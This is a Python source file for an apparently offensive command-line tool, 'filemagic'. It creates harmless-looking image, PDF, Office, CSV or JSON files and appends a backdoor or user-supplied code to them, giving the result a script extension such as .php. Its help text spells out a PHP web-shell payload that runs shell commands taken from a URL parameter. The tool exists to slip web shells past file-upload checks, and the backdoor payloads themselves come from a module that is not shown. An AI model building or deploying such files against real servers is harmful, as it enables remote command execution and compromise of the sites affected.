#!/usr/bin/env  python
########## IMPORTS ###########
try:
    from PIL import Image, ImageDraw
    from docx import Document
    import xlsxwriter
    import json
    import csv
    import argparse
    import random
    import sys
    import re
except ImportError:
    print("[!] You're missing some packages, maybe you forgot to install the tool?")
##############################

try:
    from utils import backdoors
except ImportError:
    from .utils import backdoors

class Filemagic:
    def __init__(self): 
        self.parser = argparse.ArgumentParser(prog="""
        filemagic -f image.php -b php,
        filemagic -e png -b php,
        filemagic -e png -c <?php phpinfo(); ?>
        """)

        if len(sys.argv) == 1:
            self.parser.print_help(sys.stderr)
            sys.exit(1)

        self.args = None
        self.file = None
        self.backdoor = None
        self.code = None
        self.extension = None

        self.generated_filename = ""

    def argparser(self):
        self.parser.add_argument('-f', '--file', help="File to be read (filename)")
        self.parser.add_argument('-b', '--backdoor', help="Backdoor to imbedd (php),(c),(python),(perl)...")
        self.parser.add_argument('-c', '--code', help="Code to imbedd (<?php system($_GET['cmd']); ?>)")
        self.parser.add_argument('-e', '--extension', help="File-extension to generate (png), (jpeg), (gif)...")
        self.args = vars(self.parser.parse_args())
        return self.args

    def set_args(self):
        for k_arg, v_arg in self.args.items():
            if k_arg == 'file' and v_arg: self.file = v_arg
            elif k_arg == 'backdoor' and v_arg: self.backdoor = v_arg
            elif k_arg == 'code' and v_arg: self.code= v_arg
            elif k_arg == 'extension' and v_arg: self.extension = v_arg

    def generate_file(self):
        """ Generate a file """
        if self.extension:
            for _ in range(6):
                self.generated_filename += str(random.randint(0,9)) 
            self.generated_filename+='.'+self.extension
            print(self.generated_filename)

            if self.extension in [
                'png', 'jpeg', 'gif', 'tiff',
                'bmp', 'ppm', 'pgm', 'pbm',
                'pcx', 'tga', 'webp', 'ico',
                'eps', 'im', 'psd'
                ]:
                
                # Prepare imagetype
                img = Image.new('RGB', (200, 100), color = 'blue')
                d = ImageDraw.Draw(img)
                d.text((10,10), f"<(O_O)> yodat", fill='yellow')
                
                # save with given extension
                img.save(self.generated_filename)

            elif self.extension == 'pdf':
                # list to hold image frames
                frames = []
                
                # Prepare images
                for i in range(3):
                    img = Image.new('RGB', (200, 200), color='blue')
                    d = ImageDraw.Draw(img)
                    d.text((10, 10), f"<(O_O)> yoda", fill='yellow')

                    # Append the image frame to the list
                    frames.append(img)

                # save as pdf
                frames[0].save(self.generated_filename,
                               save_all=True, append_images=frames[1:])

            elif self.extension == 'xlsx':
                workbook = xlsxwriter.Workbook(self.generated_filename)
                worksheet = workbook.add_worksheet()

                worksheet.write('A1', 'Pogchamp, Excel!')
                workbook.close()

            elif self.extension == 'docx':
                document = Document()
                document.add_paragraph('Hello, World!')
                document.save(self.generated_filename)

            elif self.extension == 'csv':
                with open(f'{self.generated_filename}', mode='w', newline='') as file:
                    writer = csv.writer(file)
                    writer.writerow(['Name', 'City'])
                    writer.writerow(['John', 'New York'])
                    writer.writerow(['Bob', 'Las Angeles'])

            elif self.extension == 'json':
                data = {
                    "name":"John",
                    "age":"9999999",
                    "City":"New York"
                }

                with open(f'{self.generated_filename}', 'w') as file:
                    json.dump(data, file)

    def generate_backdoor(self):
        if self.file and not self.extension:
            backdoor_name = self.file.split('.')[0]
            backdoor_name+='.'+str(self.backdoor)

            with open(self.file, 'rb') as file:
                if self.backdoor and not self.code:
                    with open(backdoor_name, 'wb') as bd_file:
                        bd_file.write(file.read())
                        bd_file.write(backdoors.backdoors[self.backdoor].encode('utf-8'))
                else:
                    with open(backdoor_name, 'wb') as bd_file:
                        bd_file.write(file.read())
                        bd_file.write(self.code)

        elif self.extension and not self.file:
            with open(self.generated_filename, 'rb') as file:
                backdoor_name = self.generated_filename.split('.')[0]
                if self.backdoor and not self.code:
                    backdoor_name+='.'+self.backdoor
                    with open(backdoor_name, 'wb') as bd_file:
                        bd_file.write(file.read())
                        bd_file.write(backdoors.backdoors[self.backdoor].encode('utf-8'))
                elif self.code and not self.backdoor:

                    #TODO fix logic for detecting fileextension based on code
                    # predict the filetype of the given "code" (not always reliable)
                    matches = {}
                    for k, v in backdoors.backdoors.items():
                        matches[k] = 0

                    for i in self.code.split(' '):
                        for k, v in backdoors.backdoors.items():
                            for y in v.split(' '):
                                escaped_i = re.escape(i)
                                pattern = fr'{escaped_i}.*?'
                                if re.search(pattern, v):
                                    matches[k] = matches[k] + 1 
                    
                    # grab highest val in matches #
                    highest_predict = max(matches, key=matches.get)
                    
                    # create backdoor file
                    print("[!] No filetype specified")
                    print(f"[+] Trying to predict the filetype: {highest_predict}")
                    backdoor_name+='.'+highest_predict
                    with open(backdoor_name, 'wb') as bd_file:
                        bd_file.write(file.read())
                        bd_file.write(self.code.encode('utf-8'))


def main():
    filemagic = Filemagic()
    filemagic.argparser()
    filemagic.set_args()
    filemagic.generate_file()
    filemagic.generate_backdoor()

if __name__ == '__main__':
    main()
